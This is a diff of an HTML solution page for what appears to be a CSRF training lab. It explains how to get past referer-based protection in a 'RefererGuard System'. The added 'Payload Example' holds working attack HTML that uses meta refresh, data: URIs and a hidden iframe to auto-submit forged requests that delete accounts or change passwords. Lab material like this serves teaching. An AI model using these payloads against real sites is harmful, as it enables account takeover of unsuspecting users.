@@ -9,13 +9,13 @@
             <div class="card-header bg-success text-white">
                 <h2 class="text-center">
                     <i class="bi bi-lightbulb-fill me-2"></i>
-                    Level 6 Solution: Advanced CSRF Level 6
+                    Level 6 Solution: Referrer-based Protection Bypass
                 </h2>
             </div>
             <div class="card-body">
                 <div class="alert alert-info">
                     <h4><i class="bi bi-info-circle-fill me-2"></i>Challenge Overview</h4>
-                    <p>This advanced CSRF challenge demonstrates modern attack techniques and bypass methods.</p>
+                    <p>This challenge demonstrates how to bypass referrer-based CSRF protection in the RefererGuard System by manipulating or removing the HTTP Referer header.</p>
                 </div>
 
                 <div class="card mb-4">
@@ -23,8 +23,8 @@
                         <h4 class="mb-0"><i class="bi bi-tools me-2"></i>Tools Required</h4>
                     </div>
                     <div class="card-body">
-                        <p><strong>Primary Tools:</strong> Burp Suite, Browser Developer Tools, Custom Scripts</p>
-                        <p><strong>Skills:</strong> CSRF exploitation, HTTP request manipulation, Web security testing</p>
+                        <p><strong>Primary Tools:</strong> Burp Suite (for header manipulation), Browser Developer Tools, Custom HTML with meta tags</p>
+                        <p><strong>Skills:</strong> HTTP header manipulation, Referer policy understanding, Meta tag exploitation</p>
                     </div>
                 </div>
 
@@ -33,18 +33,76 @@
                         <h4 class="mb-0"><i class="bi bi-list-ol me-2"></i>Step-by-Step Solution</h4>
                     </div>
                     <div class="card-body">
-                        
+
                         <ol>
-                            <li><strong>Reconnaissance:</strong> Analyze the target application and identify CSRF protection mechanisms</li>
-                            <li><strong>Vulnerability Assessment:</strong> Test for CSRF vulnerabilities in critical functions</li>
-                            <li><strong>Bypass Development:</strong> Develop techniques to bypass the implemented protections</li>
-                            <li><strong>Payload Crafting:</strong> Create a malicious payload that exploits the CSRF vulnerability</li>
-                            <li><strong>Attack Execution:</strong> Execute the attack and verify successful exploitation</li>
-                            <li><strong>Impact Assessment:</strong> Document the security impact and potential damage</li>
+                            <li><strong>Analyze Referer Protection:</strong> Identify that RefererGuard System validates the HTTP Referer header</li>
+                            <li><strong>Test Referer Validation:</strong> Understand what referer values are accepted by the system</li>
+                            <li><strong>Use Meta Refresh Technique:</strong> Implement meta refresh to remove referer information</li>
+                            <li><strong>Try Data URI Method:</strong> Use data: URIs to bypass referer checks</li>
+                            <li><strong>Exploit HTTPS to HTTP:</strong> Leverage referer policy differences between protocols</li>
+                            <li><strong>Execute Bypass Attack:</strong> Craft the final payload that successfully bypasses referer validation</li>
                         </ol>
                         <div class="alert alert-warning mt-3">
-                            <strong>Key Insight:</strong> Advanced CSRF attacks require understanding of modern web security mechanisms.
+                            <strong>Key Insight:</strong> Referer-based protection can be bypassed using various techniques that manipulate or remove the referer header.
                         </div>
+                    </div>
+                </div>
+
+                <div class="card mb-4">
+                    <div class="card-header bg-success text-white">
+                        <h4 class="mb-0"><i class="bi bi-code-slash me-2"></i>Payload Example</h4>
+                    </div>
+                    <div class="card-body">
+                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;!-- Referer Bypass Attack --&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;!-- Method 1: Meta refresh to remove referer --&gt;
+    &lt;meta http-equiv="refresh" content="0; url=data:text/html,&lt;script&gt;
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'http://target.com/csrf/level6';
+
+        var input1 = document.createElement('input');
+        input1.type = 'hidden';
+        input1.name = 'referrer_url';
+        input1.value = 'https://trusted-domain.com';
+        form.appendChild(input1);
+
+        var input2 = document.createElement('input');
+        input2.type = 'hidden';
+        input2.name = 'target_action';
+        input2.value = 'delete_account';
+        form.appendChild(input2);
+
+        var input3 = document.createElement('input');
+        input3.type = 'hidden';
+        input3.name = 'payload_data';
+        input3.value = 'malicious_data';
+        form.appendChild(input3);
+
+        document.body.appendChild(form);
+        form.submit();
+    &lt;/script&gt;"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h3&gt;Processing...&lt;/h3&gt;
+
+    &lt;!-- Method 2: Direct form with no referer --&gt;
+    &lt;form id="csrf-form" action="http://target.com/csrf/level6" method="POST" style="display:none;"&gt;
+        &lt;input type="hidden" name="referrer_url" value="https://trusted-domain.com"&gt;
+        &lt;input type="hidden" name="target_action" value="change_password"&gt;
+        &lt;input type="hidden" name="payload_data" value="new_password_123"&gt;
+    &lt;/form&gt;
+
+    &lt;!-- Method 3: Iframe with data URI --&gt;
+    &lt;iframe src="data:text/html,&lt;form action='http://target.com/csrf/level6' method='POST'&gt;
+        &lt;input type='hidden' name='referrer_url' value='https://trusted-domain.com'&gt;
+        &lt;input type='hidden' name='target_action' value='update_profile'&gt;
+        &lt;input type='hidden' name='payload_data' value='malicious_update'&gt;
+        &lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;"
+        style="display:none;"&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
                     </div>
                 </div>
 
